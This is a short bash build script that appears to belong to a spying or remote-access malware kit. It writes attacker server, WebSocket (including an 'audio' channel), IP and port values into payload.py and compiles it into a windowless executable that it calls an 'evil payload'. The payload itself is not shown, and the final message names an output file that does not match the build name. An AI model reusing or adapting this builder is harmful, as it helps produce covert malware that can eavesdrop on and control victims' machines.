#!/bin/bash
detect_os() {
  if [[ "$OSTYPE" == "darwin"* ]]; then
    echo "mac"
  elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
    echo "linux"
  else
    echo "unknown"
  fi
}
OS=$(detect_os)
SERVER_URL=$1
WEBSOCKET_URL=$2
WEBSOCKET_AUDIO=$3
IP_ADDRESS=$4
PORT=$5
if [ -z "$SERVER_URL" ] || [ -z "$WEBSOCKET_URL" ] || [ -z "$WEBSOCKET_AUDIO" ] || [ -z "$IP_ADDRESS" ] || [ -z "$PORT" ]; then
  echo "Usage: ./build.sh SERVER_URL WEBSOCKET_URL WEBSOCKET_AUDIO IP PORT"
  exit 1
fi
echo "[*] OS detected: $OS"
echo "[*] Creating temp file..."
cp payload.py payload_temp.py
echo "[*] Replacing placeholders..."
if [ "$OS" == "mac" ]; then
  sed -i '' "s|__SERVER_URL__|$SERVER_URL|g" payload_temp.py
  sed -i '' "s|__WEBSOCKET_URL__|$WEBSOCKET_URL|g" payload_temp.py
  sed -i '' "s|__WEBSOCKET_AUDIO__|$WEBSOCKET_AUDIO|g" payload_temp.py
  sed -i '' "s|__IP_ADDRESS__|$IP_ADDRESS|g" payload_temp.py
  sed -i '' "s|__PORT__|$PORT|g" payload_temp.py
else
  sed -i "s|__SERVER_URL__|$SERVER_URL|g" payload_temp.py
  sed -i "s|__WEBSOCKET_URL__|$WEBSOCKET_URL|g" payload_temp.py
  sed -i "s|__WEBSOCKET_AUDIO__|$WEBSOCKET_AUDIO|g" payload_temp.py
  sed -i "s|__IP_ADDRESS__|$IP_ADDRESS|g" payload_temp.py
  sed -i "s|__PORT__|$PORT|g" payload_temp.py
fi
echo "[*] Building evil payload..."
pyinstaller --onefile --noconsole --name payload ./payload_temp.py
echo "[*] Cleaning up..."
rm -f payload_temp.py
rm -rf __pycache__ build/
echo "[+] Evil payload built: dist/evil_payload 😈"